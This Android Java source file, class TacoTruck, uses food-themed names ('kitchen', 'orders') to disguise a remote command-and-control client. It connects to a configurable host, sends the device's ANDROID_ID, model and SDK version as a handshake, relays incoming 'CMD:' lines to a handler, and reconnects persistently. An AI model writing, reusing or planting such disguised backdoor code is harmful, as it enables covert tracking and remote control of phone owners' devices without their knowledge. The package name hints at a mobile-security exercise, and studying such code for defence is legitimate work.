package com.example.mobsec_823;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class TacoTruck {
    private static final String TAG = "TacoTruck";
    private final String kitchenIp;
    private final int kitchenPort;
    private final OrderListener listener;
    private final Context context;
    private Socket socket;
    private PrintWriter out;
    private InputStream in;
    private volatile boolean isOpen = false;

    public interface OrderListener {
        void onOrderReceived(String order);
    }

    public TacoTruck(Context context, String ip, int port, OrderListener listener) {
        this.context = context;
        this.kitchenIp = ip;
        this.kitchenPort = port;
        this.listener = listener;
    }

    public void openForBusiness() {
        if (isOpen) return;
        isOpen = true;

        new Thread(() -> {
            while (isOpen) {
                try {
                    Log.d(TAG, "Connecting to kitchen at " + kitchenIp + ":" + kitchenPort);
                    socket = new Socket(kitchenIp, kitchenPort);
                    out = new PrintWriter(socket.getOutputStream(), true);
                    in = socket.getInputStream();
                    Log.d(TAG, "Successfully connected to the kitchen!");

                    // Perform handshake as per SleepyMob protocol
                    sendHandshake();

                    // Listen for commands until the connection is lost
                    listenForOrders();

                } catch (Exception e) {
                    Log.e(TAG, "Lost connection to the kitchen: " + e.getMessage());
                } finally {
                    closeShop();
                    if (isOpen) {
                        try {
                            Log.d(TAG, "Will try to reconnect in 5 seconds...");
                            Thread.sleep(5000);
                        } catch (InterruptedException ie) {
                            Thread.currentThread().interrupt();
                            break;
                        }
                    }
                }
            }
        }).start();
    }

    private void sendHandshake() {
        String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        String model = Build.MODEL;
        int sdk = Build.VERSION.SDK_INT;
        String handshakeMsg = String.format("ID:%s;MODEL:%s;SDK:%d", deviceId, model, sdk);
        Log.d(TAG, "Sending handshake: " + handshakeMsg);
        sendToKitchen(handshakeMsg);
    }

    private void listenForOrders() throws Exception {
        BufferedReader reader = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8));
        String line;
        while ((line = reader.readLine()) != null) {
            Log.d(TAG, "Received from kitchen: " + line);
            if (line.startsWith("CMD:")) {
                if (listener != null) {
                    listener.onOrderReceived(line.substring(4));
                }
            } else {
                Log.w(TAG, "Received non-command line: " + line);
            }
        }
        throw new Exception("Server closed the connection gracefully.");
    }

    public void sendToKitchen(String message) {
        if (out != null) {
            // Run on a new thread to avoid blocking the caller
            new Thread(() -> out.println(message)).start();
        } else {
            Log.w(TAG, "Not connected to kitchen, can't send message.");
        }
    }

    public void closeDown() {
        isOpen = false;
        closeShop();
    }

    private void closeShop() {
        try {
            if (socket != null && !socket.isClosed()) {
                socket.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error closing the truck down.", e);
        }
        socket = null;
        out = null;
        in = null;
    }
}
